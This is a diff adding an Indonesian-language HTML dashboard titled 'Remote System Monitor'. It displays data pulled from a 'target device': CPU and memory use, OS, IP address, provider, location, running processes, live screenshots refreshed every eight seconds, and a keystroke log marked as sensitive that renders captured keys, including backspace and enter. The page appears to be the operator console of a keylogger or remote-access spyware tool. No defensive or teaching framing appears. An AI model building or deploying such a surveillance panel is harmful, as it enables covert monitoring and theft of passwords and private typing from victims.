@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Remote System Monitor</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        body { font-family: 'Inter', sans-serif; }
+        .card { background-color: white; border-radius: 0.75rem; box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1); }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3b82f6; border-radius: 50%; width: 40px; height: 40px; animation: spin 1.5s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #keylog-display { font-family: 'Courier New', Courier, monospace; white-space: pre-wrap; word-wrap: break-word; }
+        .key-char { color: #e5e7eb; } .key-space { color: #6b7280; } .key-special { color: #60a5fa; font-weight: bold; }
+        .key-enter::before { content: '↵\A'; white-space: pre; }
+    </style>
+</head>
+<body class="bg-gray-100 text-gray-800">
+
+    <div class="container mx-auto p-4 md:p-8">
+        <header class="mb-8">
+            <h1 class="text-3xl md:text-4xl font-bold text-gray-900">Dashboard Monitoring Jarak Jauh</h1>
+            <p class="text-gray-600 mt-1">Melihat status perangkat target secara real-time.</p>
+        </header>
+
+        <main class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+            <!-- System Status & Processes -->
+            <div class="lg:col-span-1 flex flex-col gap-6">
+                <!-- System Status -->
+                <div class="card p-6">
+                    <h2 class="text-xl font-semibold mb-4">Status Sistem</h2>
+                    <div class="space-y-4">
+                        <!-- CPU & Memory -->
+                        <div>
+                            <div class="flex justify-between items-center mb-1"><span class="text-sm font-medium text-gray-600">Penggunaan CPU</span><span id="cpu-usage" class="text-sm font-bold text-blue-600">--%</span></div>
+                            <div class="w-full bg-gray-200 rounded-full h-2.5"><div id="cpu-bar" class="bg-blue-600 h-2.5 rounded-full" style="width: 0%"></div></div>
+                        </div>
+                        <div>
+                            <div class="flex justify-between items-center mb-1"><span class="text-sm font-medium text-gray-600">Penggunaan Memori</span><span id="mem-usage" class="text-sm font-bold text-green-600">--%</span></div>
+                            <div class="w-full bg-gray-200 rounded-full h-2.5"><div id="mem-bar" class="bg-green-600 h-2.5 rounded-full" style="width: 0%"></div></div>
+                            <div class="text-right text-xs text-gray-500 mt-1" id="mem-detail">-- / -- GB</div>
+                        </div>
+                    </div>
+                    <!-- Info OS & Jaringan -->
+                    <div class="mt-6 pt-4 border-t border-gray-200 text-sm space-y-2">
+                        <div class="flex justify-between gap-4"><span class="font-medium text-gray-600 shrink-0">Sistem Operasi</span><span id="os-info" class="text-gray-800 font-mono text-right truncate">--</span></div>
+                        <div class="flex justify-between"><span class="font-medium text-gray-600">Alamat IP</span><span id="ip-info" class="text-gray-800 font-mono">--</span></div>
+                        <div class="flex justify-between gap-4"><span class="font-medium text-gray-600 shrink-0">Provider</span><span id="provider-info" class="text-gray-800 text-right truncate">--</span></div>
+                        <div class="flex justify-between"><span class="font-medium text-gray-600">Lokasi</span><span id="location-info" class="text-gray-800 text-right">--</span></div>
+                    </div>
+                </div>
+
+                <!-- Processes -->
+                <div class="card p-6">
+                    <h2 class="text-xl font-semibold mb-4">Daftar Proses</h2>
+                    <div id="process-list" class="h-96 overflow-y-auto bg-gray-50 p-3 rounded-md border text-sm"><div class="flex justify-center items-center h-full"><div class="loader"></div></div></div>
+                </div>
+            </div>
+
+            <!-- Screenshot & Keylogger -->
+            <div class="lg:col-span-2 flex flex-col gap-6">
+                <!-- Screenshot -->
+                <div class="card p-6">
+                    <h2 class="text-xl font-semibold mb-4">Live Screenshot</h2>
+                    <div id="screenshot-container" class="relative bg-gray-200 rounded-lg flex items-center justify-center min-h-[400px]">
+                        <div id="screenshot-loader" class="loader"></div>
+                        <img id="screenshot-img" src="" alt="Live screenshot" class="rounded-lg max-w-full max-h-full object-contain hidden">
+                    </div>
+                </div>
+                <!-- Keylogger -->
+                <div class="card p-6">
+                    <h2 class="text-xl font-semibold mb-2">Log Ketikan <span class="text-sm font-normal text-red-600">(Sensitif!)</span></h2>
+                    <div id="keylog-display" class="h-48 overflow-y-auto bg-gray-900 text-white p-4 rounded-md border border-gray-700 text-base leading-relaxed">
+                        <span class="text-gray-400">Menunggu ketikan dari perangkat target...</span>
+                        <span id="cursor" class="bg-white w-0.5 h-5 inline-block animate-pulse"></span>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        const API = { data: '/api/data', screenshot: '/api/screenshot', keystrokes: '/api/keystrokes' };
+        const Elem = {
+            cpuUsage: document.getElementById('cpu-usage'), cpuBar: document.getElementById('cpu-bar'),
+            memUsage: document.getElementById('mem-usage'), memBar: document.getElementById('mem-bar'), memDetail: document.getElementById('mem-detail'),
+            processList: document.getElementById('process-list'),
+            screenshotImg: document.getElementById('screenshot-img'), screenshotLoader: document.getElementById('screenshot-loader'),
+            keylogDisplay: document.getElementById('keylog-display'), cursor: document.getElementById('cursor'),
+            // Element baru
+            osInfo: document.getElementById('os-info'), ipInfo: document.getElementById('ip-info'),
+            locationInfo: document.getElementById('location-info'), providerInfo: document.getElementById('provider-info')
+        };
+        let isFirstKeylog = true;
+
+        async function updateSystemData() {
+            try {
+                const response=await fetch(API.data);if(!response.ok)throw new Error(`HTTP error! status: ${response.status}`);
+                const data=await response.json();
+                // Update CPU & Memori
+                const cpuPercent=data.system.cpu_usage.toFixed(1);const memPercent=data.system.memory_info.percent.toFixed(1);
+                Elem.cpuUsage.textContent=`${cpuPercent}%`;Elem.cpuBar.style.width=`${cpuPercent}%`;
+                Elem.memUsage.textContent=`${memPercent}%`;Elem.memBar.style.width=`${memPercent}%`;
+                Elem.memDetail.textContent=`${data.system.memory_info.used_gb} GB / ${data.system.memory_info.total_gb} GB`;
+                // Update Info OS & Jaringan
+                if(data.os){Elem.osInfo.textContent=data.os;}
+                if(data.network){Elem.ipInfo.textContent=data.network.ip;Elem.locationInfo.textContent=data.network.location;Elem.providerInfo.textContent=data.network.provider;}
+                // Update Daftar Proses
+                let processHtml='<ul class="space-y-2">';data.processes.forEach(p=>{processHtml+=`<li class="truncate"><span class="font-mono text-xs bg-gray-200 px-1.5 py-0.5 rounded">${p.pid}</span> <span class="font-medium">${p.name}</span> <span class="text-gray-500">(${p.username||'N/A'})</span></li>`;});processHtml+='</ul>';Elem.processList.innerHTML=processHtml;
+            } catch(error){console.error('Gagal memuat data sistem:', error);}
+        }
+
+        async function updateScreenshot() { /* ... kode tidak berubah ... */ Elem.screenshotImg.classList.add('hidden');Elem.screenshotLoader.classList.remove('hidden');try{const response=await fetch(`${API.screenshot}?t=${new Date().getTime()}`);if(!response.ok)throw new Error(`HTTP error! status: ${response.status}`);const imageBlob=await response.blob();Elem.screenshotImg.src=URL.createObjectURL(imageBlob);}catch(error){console.error('Gagal memuat screenshot:',error);}finally{Elem.screenshotImg.onload=()=>{Elem.screenshotImg.classList.remove('hidden');Elem.screenshotLoader.classList.add('hidden');}}}
+        async function updateKeystrokes() { /* ... kode tidak berubah ... */ try{const response=await fetch(API.keystrokes);if(!response.ok)return;const keys=await response.json();if(keys.length>0){if(isFirstKeylog){Elem.keylogDisplay.innerHTML='';Elem.keylogDisplay.appendChild(Elem.cursor);isFirstKeylog=false;}keys.forEach(key=>{const span=document.createElement('span');Elem.cursor.remove();if(key==='[BACKSPACE]'){const lastChild=Elem.keylogDisplay.lastChild;if(lastChild)Elem.keylogDisplay.removeChild(lastChild);}else if(key==='[ENTER]'){span.className='key-enter';Elem.keylogDisplay.appendChild(span);}else if(key==='[SPACE]'){span.textContent=' ';Elem.keylogDisplay.appendChild(span);}else if(key.startsWith('[')&&key.endsWith(']')){span.textContent=` ${key} `;span.className='key-special';Elem.keylogDisplay.appendChild(span);}else{span.textContent=key;span.className='key-char';Elem.keylogDisplay.appendChild(span);}Elem.keylogDisplay.appendChild(Elem.cursor);});Elem.keylogDisplay.scrollTop=Elem.keylogDisplay.scrollHeight;}}catch(error){console.error('Gagal mengambil data ketikan:',error);}}
+        
+        document.addEventListener('DOMContentLoaded', () => {
+            updateSystemData();
+            updateScreenshot();
+            updateKeystrokes();
+            setInterval(updateSystemData, 5000); 
+            setInterval(updateScreenshot, 8000);
+            setInterval(updateKeystrokes, 2000);
+        });
+    </script>
+</body>
+</html>
